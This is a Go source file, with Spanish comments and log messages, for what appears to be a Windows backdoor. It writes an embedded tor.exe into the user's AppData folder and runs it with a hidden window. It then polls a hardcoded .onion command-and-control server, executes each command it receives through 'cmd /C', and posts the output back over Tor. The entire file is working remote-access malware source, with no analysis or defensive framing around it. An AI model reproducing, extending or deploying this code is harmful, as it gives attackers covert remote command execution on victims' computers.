package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	_ "embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

//go:embed tor.exe
var torExeBytes []byte

const (
	onionURL         = "https://wefoq3vffzrazdzpr556o5gbommfqgbfpb2qordwxkiluc2cq5bvtkid.onion:80/"
	socksAddr        = "127.0.0.1:9050"
	controlAddr      = "127.0.0.1:9051"
	bootstrapTimeout = 60 * time.Second
	insecureTLS      = true
	pollInterval     = 5 * time.Second
)

type CmdRequest struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}

type CmdResult struct {
	ID      string `json:"id"`
	Comando string `json:"comando"`
	Salida  string `json:"salida"`
}

func writeTorExe(destDir string) (string, error) {
	if err := os.MkdirAll(destDir, 0o700); err != nil {
		return "", err
	}
	destPath := filepath.Join(destDir, "tor.exe")
	if _, err := os.Stat(destPath); err == nil {
		return destPath, nil
	}
	if err := os.WriteFile(destPath, torExeBytes, 0o755); err != nil {
		return "", err
	}
	return destPath, nil
}

func writeTorrc(torDataDir string) (string, error) {
	if err := os.MkdirAll(torDataDir, 0o700); err != nil {
		return "", err
	}
	torrc := fmt.Sprintf(`DataDirectory %s
SocksPort 127.0.0.1:9050
ControlPort 127.0.0.1:9051
CookieAuthentication 1
Log notice stdout
RunAsDaemon 0
`, torDataDir)
	torrcPath := filepath.Join(torDataDir, "torrc_local")
	if err := os.WriteFile(torrcPath, []byte(torrc), 0o600); err != nil {
		return "", err
	}
	return torrcPath, nil
}

func startTor(torExePath, torrcPath string) (*exec.Cmd, io.ReadCloser, io.ReadCloser, error) {
	cmd := exec.Command(torExePath, "-f", torrcPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, nil, nil, err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return nil, nil, nil, err
	}
	if err := cmd.Start(); err != nil {
		return nil, nil, nil, err
	}
	return cmd, stdout, stderr, nil
}

func streamLogs(r io.ReadCloser, prefix string) {
	scanner := bufio.NewScanner(r)
	for scanner.Scan() {
		fmt.Printf("%s %s\n", prefix, scanner.Text())
	}
}

func waitForBootstrap(controlAddr, cookiePath string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		c, err := os.ReadFile(cookiePath)
		if err != nil {
			time.Sleep(300 * time.Millisecond)
			continue
		}
		hexCookie := strings.ToUpper(hex.EncodeToString(c))

		conn, err := net.DialTimeout("tcp", controlAddr, 2*time.Second)
		if err != nil {
			time.Sleep(300 * time.Millisecond)
			continue
		}

		fmt.Fprintln(conn, "AUTHENTICATE "+hexCookie)
		r := bufio.NewReader(conn)
		line, err := r.ReadString('\n')
		if err != nil {
			conn.Close()
			time.Sleep(300 * time.Millisecond)
			continue
		}
		if !strings.HasPrefix(line, "250") {
			conn.Close()
			time.Sleep(300 * time.Millisecond)
			continue
		}

		for time.Now().Before(deadline) {
			fmt.Fprintln(conn, "GETINFO status/bootstrap-phase")
			resp, err := r.ReadString('\n')
			if err != nil {
				break
			}
			if strings.Contains(resp, "PROGRESS=100") {
				conn.Close()
				return nil
			}
			for {
				l, _ := r.ReadString('\n')
				if l == "" || strings.HasPrefix(l, "250") {
					break
				}
			}
			time.Sleep(300 * time.Millisecond)
		}
		conn.Close()
	}
	return fmt.Errorf("timeout waiting for tor bootstrap")
}

func makeTorHTTPClient(socksAddr string, insecure bool) (*http.Client, error) {
	dialer, err := proxy.SOCKS5("tcp", socksAddr, nil, proxy.Direct)
	if err != nil {
		return nil, err
	}
	tr := &http.Transport{
		Dial: dialer.Dial,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: insecure,
		},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   60 * time.Second,
	}
	return client, nil
}

var lastExecutedID string

func pollAndExec(client *http.Client) {
	for {
		// GET comando del servidor
		resp, err := client.Get(onionURL + "comando")
		if err != nil {
			time.Sleep(pollInterval)
			continue
		}

		if resp.StatusCode == http.StatusNoContent {
			resp.Body.Close()
			time.Sleep(pollInterval)
			continue
		}

		var cmdReq CmdRequest
		if err := json.NewDecoder(resp.Body).Decode(&cmdReq); err != nil {
			resp.Body.Close()
			time.Sleep(pollInterval)
			continue
		}
		resp.Body.Close()

		if cmdReq.ID == "" || cmdReq.Cmd == "" {
			time.Sleep(pollInterval)
			continue
		}

		// Ejecutar solo si es nuevo
		if cmdReq.ID == lastExecutedID {
			time.Sleep(pollInterval)
			continue
		}

		lastExecutedID = cmdReq.ID

		out, err := exec.Command("cmd", "/C", cmdReq.Cmd).CombinedOutput()
		output := string(out)
		if err != nil {
			output += "\nError: " + err.Error()
		}

		// Enviar resultado
		res := CmdResult{
			ID:      cmdReq.ID,
			Comando: cmdReq.Cmd,
			Salida:  output,
		}
		b, _ := json.Marshal(res)
		resp2, err := client.Post(onionURL+"comando", "application/json", bytes.NewReader(b))
		if err == nil {
			resp2.Body.Close()
		}

		time.Sleep(2 * time.Second)
	}
}

func main() {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = "."
	}
	torDir := filepath.Join(appData, "MiApp", "tor")
	torData := filepath.Join(appData, "MiApp", "tor-data")

	torExePath, err := writeTorExe(torDir)
	if err != nil {
		log.Fatalf("Error escribiendo tor.exe: %v", err)
	}
	log.Printf("tor.exe ubicado en: %s\n", torExePath)

	torrcPath, err := writeTorrc(torData)
	if err != nil {
		log.Fatalf("Error creando torrc: %v", err)
	}
	log.Printf("torrc creado en: %s\n", torrcPath)

	cmd, stdout, stderr, err := startTor(torExePath, torrcPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err != nil {
		log.Fatalf("Error arrancando tor: %v", err)
	}
	defer func() {
		if cmd != nil && cmd.Process != nil {
			_ = cmd.Process.Signal(os.Interrupt)
			time.Sleep(500 * time.Millisecond)
			_ = cmd.Process.Kill()
		}
	}()

	go streamLogs(stdout, "[tor]")
	go streamLogs(stderr, "[tor-err]")

	cookiePath := filepath.Join(torData, "control_auth_cookie")
	log.Printf("Esperando bootstrap de Tor (timeout %s)...\n", bootstrapTimeout.String())
	if err := waitForBootstrap(controlAddr, cookiePath, bootstrapTimeout); err != nil {
		log.Fatalf("Tor no se bootstrappeó: %v", err)
	}
	log.Println("Tor listo: Bootstrapped 100%")

	client, err := makeTorHTTPClient(socksAddr, insecureTLS)
	if err != nil {
		log.Fatalf("Error creando cliente Tor: %v", err)
	}

	pollAndExec(client)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
}
